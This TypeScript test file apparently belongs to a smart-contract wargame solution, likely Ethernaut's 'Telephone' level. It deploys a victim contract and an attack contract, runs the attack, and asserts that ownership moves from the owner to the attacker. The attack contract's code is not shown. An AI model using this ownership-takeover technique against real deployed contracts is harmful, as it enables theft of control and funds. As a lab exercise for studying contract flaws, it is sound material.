
import { accounts, contract } from '@openzeppelin/test-environment';
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Telephone = contract.fromArtifact('Telephone');
const TelephoneAttack = contract.fromArtifact('TelephoneAttack');
let telephone: any;
let telephoneAttack: any;

beforeEach(async () => {
    telephone = await Telephone.new({ from: owner });
    telephoneAttack = await TelephoneAttack.new({ from: attacker });
});

it.only('Telephone -> claim ownership of the contract ', async () => {

    // Owner at the beginning
    const ownerBefore = await telephone.owner.call();

    // Launch the attack
    await telephoneAttack.attack1(telephone.address, { from: attacker });

    // Owner at the end
    const ownerAfter = await telephone.owner.call();

    console.log('before', ownerBefore)
    console.log('after', ownerAfter)


    assert(ownerBefore === owner);
    assert(ownerAfter === attacker);

});

